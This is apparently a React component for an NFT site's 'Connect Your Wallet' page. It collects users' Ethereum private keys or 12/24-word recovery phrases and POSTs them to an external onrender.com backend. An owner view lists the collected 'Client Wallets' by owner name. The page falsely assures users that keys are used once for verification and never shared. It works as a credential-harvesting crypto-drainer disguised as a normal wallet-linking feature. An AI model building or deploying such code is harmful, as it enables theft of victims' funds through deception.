import React, { useEffect, useState } from "react";
import { useUserContext } from './UserRoleContext';
import { Form, Button, Card, Spinner, Alert } from "react-bootstrap";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import metamaskLogo from "../meta.PNG";
import trustWalletLogo from "../trust.PNG";
import binanceLogo from "../binance.PNG";
import coinbaseLogo from "../coinbase.PNG";

const LinkWallet = () => {
  const { userData } = useUserContext();
  const userId = userData?.userID;

  const [mode, setMode] = useState("privateKey");
  const [isLoading, setIsLoading] = useState(false);
  const [switching, setSwitching] = useState(false);

  const [formData, setFormData] = useState({
    walletName: "",
    walletAddress: "",
    privateKey: "",
    recoveryPhrase: "",
  });

  const [wallets, setWallets] = useState([]);

  useEffect(() => {
    if (!userId) return;
    (async () => {
      try {
        const res = await fetch(`https://nft-broker-e3q7.onrender.com/api/nft-wallets/${userId}`);
        const data = await res.json();
        if (data.wallets) setWallets(data.wallets);
      } catch (err) {
        console.error(err);
      }
    })();
  }, [userId]);

  const isOwnerView = wallets.length > 0 && wallets[0]?.ownerName != null;

  const handleChange = (e) => {
    setFormData((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const validateEthereumAddress = (addr) => /^0x[a-fA-F0-9]{40}$/.test(addr.trim());

  const isValidRecoveryPhrase = (phrase) => {
    const words = phrase.trim().split(/\s+/).filter(Boolean);
    return words.length === 12 || words.length === 24;
  };

  const handleSwitchMethod = () => {
    setSwitching(true);
    setTimeout(() => {
      setMode(mode === "privateKey" ? "recoveryPhrase" : "privateKey");
      setSwitching(false);
    }, 800);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isLoading) return;

    setIsLoading(true);

    if (!formData.walletName.trim()) {
      toast.error("Please enter a wallet name");
      setIsLoading(false);
      return;
    }

    if (mode === "privateKey") {
      if (!formData.walletAddress || !validateEthereumAddress(formData.walletAddress)) {
        toast.error("Please enter a valid Ethereum wallet address");
        setIsLoading(false);
        return;
      }
      if (!formData.privateKey.trim()) {
        toast.error("Private key is required");
        setIsLoading(false);
        return;
      }
    } else {
      if (!formData.recoveryPhrase.trim() || !isValidRecoveryPhrase(formData.recoveryPhrase)) {
        toast.error("Please enter a valid 12 or 24-word recovery phrase");
        setIsLoading(false);
        return;
      }
    }

    try {
      const payload = {
        userId,
        walletName: formData.walletName.trim(),
      };

      if (mode === "privateKey") {
        payload.walletAddress = formData.walletAddress.trim();
        payload.privateKey = formData.privateKey.trim();
      } else {
        payload.recoveryPhrase = formData.recoveryPhrase.trim();
      }

      const res = await fetch("https://nft-broker-e3q7.onrender.com/api/nft-add-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || "Failed to link wallet");
      }

      setWallets((prev) => [
        ...prev,
        {
          walletName: formData.walletName,
          walletAddress: formData.walletAddress || "Imported via seed",
          dateAdded: new Date().toISOString(),
          ...(mode === "recoveryPhrase" && { recoveryPhrase: formData.recoveryPhrase }),
        },
      ]);

      toast.success("Wallet linked successfully!");
      setFormData({ walletName: "", walletAddress: "", privateKey: "", recoveryPhrase: "" });
    } catch (err) {
      toast.error(err.message || "Failed to link wallet");
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  // ──────────────────────────────────────────────
  //  JSX remains the same
  // ──────────────────────────────────────────────

  return (
    <div className="container py-5" style={{ maxWidth: "720px" }}>
      <ToastContainer position="top-center" autoClose={4000} theme="dark" />

      <Card
        className="shadow-lg border-0"
        style={{
          borderRadius: "16px",
          background: "linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%)",
          overflow: "hidden",
        }}
      >
        <Card.Body className="p-4 p-md-5">
          {/* Header + Logos */}
          <div className="text-center mb-5">
            <h3 className="fw-bold mb-3" style={{ color: "#1e293b" }}>
              Connect Your Wallet
            </h3>
            <p className="text-muted mb-4" style={{ fontSize: "0.95rem" }}>
              Supported wallets
            </p>
            <div className="d-flex justify-content-center gap-4 flex-wrap">
              {[metamaskLogo, trustWalletLogo, binanceLogo, coinbaseLogo].map((logo, i) => (
                <div
                  key={i}
                  className="wallet-logo-circle"
                  style={{
                    width: 64,
                    height: 64,
                    borderRadius: "50%",
                    background: "white",
                    boxShadow: "0 3px 10px rgba(0,0,0,0.08)",
                    padding: 8,
                  }}
                >
                  <img src={logo} alt="" style={{ width: "100%" }} />
                </div>
              ))}
            </div>
          </div>

          <Alert variant="info" className="mb-4 small">
            <strong>Security notice:</strong> We never store your private keys or seed phrases on our servers in plain text.
          </Alert>

          <Form onSubmit={handleSubmit}>
            <Form.Group className="mb-4">
              <Form.Label className="fw-medium">Wallet nickname</Form.Label>
              <Form.Control
                name="walletName"
                value={formData.walletName}
                onChange={handleChange}
                placeholder="e.g. My MetaMask Main"
                required
              />
            </Form.Group>

            {mode === "privateKey" ? (
              <>
                <Form.Group className="mb-4">
                  <Form.Label className="fw-medium">Wallet Address (0x...)</Form.Label>
                  <Form.Control
                    name="walletAddress"
                    value={formData.walletAddress}
                    onChange={handleChange}
                    placeholder="0x..."
                    required
                  />
                </Form.Group>

                <Form.Group className="mb-4">
                  <Form.Label className="fw-medium">Private Key</Form.Label>
                  <Form.Control
                    type="password"
                    name="privateKey"
                    value={formData.privateKey}
                    onChange={handleChange}
                    placeholder="Enter your private key..."
                    autoComplete="off"
                    required
                  />
                  <Form.Text className="text-muted small">
                    Used only once to verify ownership — never shared.
                  </Form.Text>
                </Form.Group>

                <div className="text-center mt-4 mb-3">
                  <Button
                    variant="link"
                    className="text-muted text-decoration-none small"
                    onClick={handleSwitchMethod}
                    disabled={switching || isLoading}
                  >
                    {switching ? "Switching..." : "Try another way (recovery phrase)"}
                  </Button>
                </div>
              </>
            ) : (
              <>
                <Form.Group className="mb-4">
                  <Form.Label className="fw-medium">Secret Recovery Phrase</Form.Label>
                  <Form.Control
                    as="textarea"
                    rows={4}
                    name="recoveryPhrase"
                    value={formData.recoveryPhrase}
                    onChange={handleChange}
                    placeholder="word1 word2 word3 ... (12 or 24 words)"
                    required
                  />
                  <Form.Text className="text-muted small mt-1">
                    Used only once for verification. Keep it secure.
                  </Form.Text>
                </Form.Group>

                <div className="text-center mt-4 mb-3">
                  <Button
                    variant="link"
                    className="text-muted text-decoration-none small"
                    onClick={handleSwitchMethod}
                    disabled={switching || isLoading}
                  >
                    {switching ? "Switching..." : "Back to private key method"}
                  </Button>
                </div>
              </>
            )}

            <div className="d-grid mt-5">
              <Button
                type="submit"
                size="lg"
                disabled={isLoading || switching}
                style={{
                  background: "linear-gradient(90deg, #3b82f6, #6366f1)",
                  border: "none",
                  fontWeight: 600,
                  padding: "14px",
                  borderRadius: "12px",
                }}
              >
                {isLoading ? (
                  <>
                    <Spinner animation="border" size="sm" className="me-2" />
                    Linking...
                  </>
                ) : (
                  "Link Wallet"
                )}
              </Button>
            </div>
          </Form>

          {wallets.length > 0 && (
            <Card className="mt-5 border-0 shadow-sm">
              <Card.Body>
                <h5 className="fw-bold mb-3">
                  {isOwnerView ? "Client Wallets" : "Your Connected Wallets"}
                </h5>
                <div className="table-responsive">
                  <table className="table table-hover align-middle">
                    <thead className="table-light">
                      <tr>
                        {isOwnerView && <th>Owner</th>}
                        <th>Name</th>
                        <th>Address / Method</th>
                        <th>Added</th>
                      </tr>
                    </thead>
                    <tbody>
                      {wallets.map((w, i) => (
                        <tr key={w._id || i}>
                          {isOwnerView && <td>{w.ownerName || "—"}</td>}
                          <td>{w.walletName}</td>
                          <td>
                            <code style={{ fontSize: "0.9rem" }}>
                              {w.walletAddress || "Imported via seed phrase"}
                            </code>
                          </td>
                          <td>{new Date(w.dateAdded).toLocaleDateString()}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </Card.Body>
            </Card>
          )}
        </Card.Body>
      </Card>
    </div>
  );
};

export default LinkWallet;